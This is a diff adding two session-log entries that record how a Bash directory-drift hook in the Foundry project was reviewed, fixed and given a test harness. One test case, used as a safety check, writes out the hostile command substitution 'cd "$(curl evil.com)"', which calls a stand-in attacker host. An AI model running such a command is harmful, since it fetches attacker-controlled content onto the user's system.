@@ -1,6 +1,59 @@
 # Foundry Session Summary
 # Entries are ordered newest-to-oldest. Most recent session is at the top.
 
+## 2026-06-30 (Session 15 — fixed Hook 4's three gaps, built its test harness, doc-staleness pass)
+
+Picked up directly from Session 14's findings (3 confirmed gaps in `foundry-hooks` Hook 4, reported but not fixed). Followed the same verify-fix-adversarially-recheck discipline as Sessions 12-13.
+
+### What was verified before touching anything
+- Independently reproduced all three reported gaps using a bash function mirroring the hook's real extraction pipeline: `pushd /path` (regex only matches `cd`, extracts nothing), `cd -- /path` (the `--` gets captured as part of the target, fails to resolve), and `cd "$HOME/Projects/x"` (the literal string is captured with `$HOME` unexpanded, fails to resolve). All three confirmed real, matching Session 14's exact description.
+- Independently re-verified the one suspected-but-ruled-out gap (sibling directories `foundry` vs. `foundryx`) by creating both as real directories and confirming the hook's existing prefix-boundary check (`"$REAL_TARGET" != "$ROOT"/*`) already handles it correctly — agrees with Session 14's own conclusion that this was a test-harness artifact, not a real bug.
+
+### What was fixed
+- **`pushd` and `cd --`**: extended the extraction regex to `^(cd|pushd)[[:space:]]+(--[[:space:]]+)?[^&;]+`, with matching `sed` strips for the `--` separator and one layer of surrounding quotes. Cheap, in-scope for a lightweight Bash hook.
+- **Quoted variable expansion**: scoped narrowly rather than generally. Added literal, non-evaluating substitution of `~` and `$HOME` only, via bash parameter expansion (`${TARGET/#\~/$HOME}`, `${TARGET//\$HOME/$HOME}`) — explicitly *not* `eval` or general shell expansion. Reasoning: the hook only ever sees text already substituted into a `tool_input.command` string; evaluating a captured target generally (to expand arbitrary `$VAR` or `$(...)`) would mean re-executing arbitrary, potentially attacker-influenced command substitution. Verified directly that `cd "$(curl evil.com)"` is treated as a literal, non-resolving string and produces no execution — confirmed safe before considering the fix complete. Any environment variable other than `$HOME` remains an explicit, permanent, documented limitation, not a TODO — this was a judgment call made and recorded, not an oversight.
+
+### What was decided — Hook 4 test harness
+- Built one. The fixture suite's existing shape (`tests/fixtures/*.txt` — bare filename vs. regex/glob) doesn't fit Hook 4, since it needs to parse a full command string (quoting, multiple commands, expansion) against a real filesystem, not match a static string. Added the cases inline in `tests/run_fixtures.sh` instead of inventing a second file format — keeps commands with special characters (`&&`, `;`, quotes) readable. 14 cases (5 should-drift, 9 should-stay-silent, including 3 explicit false-positive checks and the `$(curl evil.com)` safety check), all passing alongside the existing 40 gitignore + 44 secrets-guard cases.
+
+### Adversarial pass on the final version (not just the draft)
+Re-tested the actual applied command (not the scratch draft) end-to-end, including piping real JSON through `jq` the way the real hook does: confirmed `pushd_helper.sh`, `cd_helper`, and `echo pushd ...` (pushd not at the start of the command) all correctly stay silent — the extension doesn't over-match on lookalike commands. Confirmed the dangerous case (`cd "$(curl evil.com)"`) produces no execution and no false drift report.
+
+### Hook 4 limitations prose updated
+`skills/foundry-hooks/SKILL.md`'s "Two known, real limitations" became a 3-item list reflecting what's still true post-fix: (1) only `cd`/`pushd` as the first token of a command is caught, (2) relative-path resolution depends on shell state the hook can't independently know, (3) only `~`/`$HOME` are expanded — any other variable or command substitution is an explicit, permanent, deliberate scope boundary (security reasoning given inline, not just stated as a fact).
+
+### Separate task — CLAUDE.md/SESSIONS.md staleness review
+Read both files in full (not just the diffs from Session 14). Findings:
+- **CLAUDE.md was stale in one concrete way**: "How to run / Bash commands" still said "No test suite yet," despite `tests/run_fixtures.sh` having existed since Session 12. Fixed.
+- **Current Status (CLAUDE.md) and this file have both grown into a long, narrative, newest-at-top running log** — 14 entries each as of Session 14, some (Sessions 4, 6, 11) spanning many paragraphs. This makes "what's the actual current state" something a reader has to reconstruct by reading top-to-bottom rather than seeing at a glance. Discussed with the user; decided to defer the actual restructure to a dedicated session, but the user proposed (and this is now the agreed plan, not just a vague "trim it" note) a concrete shape: split into an **archive doc** (e.g. `SESSIONS_ARCHIVE.md`) holding older entries in full, with this file (or CLAUDE.md's Current Status) keeping only the most recent N sessions plus a one-line pointer to the archive for anything older. This preserves full detail (which this exact staleness review just relied on to reconstruct what happened and why) without it all living in the one file/section a reader hits first. Not done yet — pick this up as its own session, not folded into ordinary feature work, since it touches the shape of every future session's doc-update habit and deserves its own sign-off on the cutover point (how many recent sessions stay inline vs. move to archive on day one).
+- No drift found between CLAUDE.md's Architecture section and the actual repo structure — every listed file/skill still exists as described.
+
+### What to do first next session
+- Decide whether to act on the CLAUDE.md Current Status trim recommendation above (move to a short current-state summary + pointer to SESSIONS.md, stop accumulating one bullet per session there) — explicitly deferred for sign-off, not because it's low-value.
+- Continue the pattern: next fresh-eyes review should probe something that hasn't had one yet (Hook 1, Hook 3, `foundry-governance`, or `foundry-stack` are all candidates with no adversarial-review history yet), per the updated CLAUDE.md Next Session Priorities.
+
+## 2026-06-30 (Session 14 — third review pass: Hook 4 directory-drift logger)
+
+After Session 13 shipped, the coder instance suggested pointing the same probing technique at other "verified" claims with no committed test — specifically `foundry-hooks` Hook 4 (the directory-drift logger), which documents two known limitations (mid-chain `cd`, relative `cd ..`) but has no fixture suite of its own (it's a `PreToolUse`/Bash hook reading `jq`-extracted command text, not a regex-against-filenames check, so it doesn't fit the existing `tests/run_fixtures.sh` shape).
+
+### What was found
+Probed the actual Hook 4 command (`skills/foundry-hooks/SKILL.md` lines 73-83) against cases beyond the documented 6 test cases and the 2 documented limitations. Three new, real, silent false-negative gaps — drift happens, nothing gets logged, no error either:
+1. **`pushd` is invisible.** Same user intent as `cd ~/other-project`, but the command regex only matches a literal leading `cd`. Not in the documented limitations at all.
+2. **`cd -- /path`** (the POSIX "end of options" separator). The `--` gets captured as part of the target string by the existing `grep -oE`, so the subsequent `cd "$TARGET"` fails to resolve, and the hook silently does nothing — even though real drift occurred.
+3. **Quoted variable expansion** (`cd "$HOME/Projects/other"`). `grep` captures the literal quoted string including the unexpanded `$HOME`, which then fails to resolve as a real path. This is a common, not edge-case, pattern — people quote paths defensively.
+
+All three share one root cause: the hook only handles a literal bareword path immediately after `cd `, not anything requiring shell evaluation (variable expansion, alternate navigation commands, option separators).
+
+One initially-suspected gap (a sibling directory with a similar name, e.g. `foundry` vs. `foundryx`) was probed and ruled out as a real bug — confirmed via direct re-test with both directories actually existing on disk; the original test artifact was caused by a nonexistent directory in the scratch harness, not a flaw in the hook's prefix-boundary logic (`$REAL_TARGET" != "$ROOT"/*` already handles the `foundryx`-vs-`foundry` case correctly).
+
+### What was decided
+- Did not fix these yet — reporting only, per the user's request, so the coder instance can address Hook 4 together with anything else surfaced this round and do its own before-shipping verification pass (the pattern Session 13 used: reproduce first, fix, then check the fix doesn't introduce a new false positive/negative, then expand whatever the right committed-test mechanism is for this hook).
+- Hook 4's limitations section should be corrected to list these three new gaps explicitly, not just the original two — the current SKILL.md text ("Two known, real limitations") is no longer accurate once these are confirmed.
+
+### What to do first next session
+- Decide whether Hook 4 needs its own fixture-style re-runnable test (it doesn't fit `tests/run_fixtures.sh`'s filename-matching shape, since it's a full bash command parser, not a regex against a static list — may need a different harness, e.g. an array of synthetic `tool_input.command` strings piped through the actual extracted hook command).
+- After fixing, update the "Two known, real limitations" language in `skills/foundry-hooks/SKILL.md` Hook 4 to reflect whatever remains true post-fix (some of these three may be fixed outright; others, like arbitrary shell evaluation, may be judged permanently out of scope and simply added to the documented limitations list instead — both are legitimate outcomes, the point is the doc should match reality either way).
+
 ## 2026-06-29 (Session 13 — second review pass finds 6 more real gaps)
 
 After Session 12 shipped, the Karbot Rage instance was told what changed and explicitly invited to look again. Rather than re-checking the existing fixture file, it deliberately probed realistic filenames not yet covered by either fixture set — a better technique, since a fixture suite by construction can never catch a case nobody thought to write down.
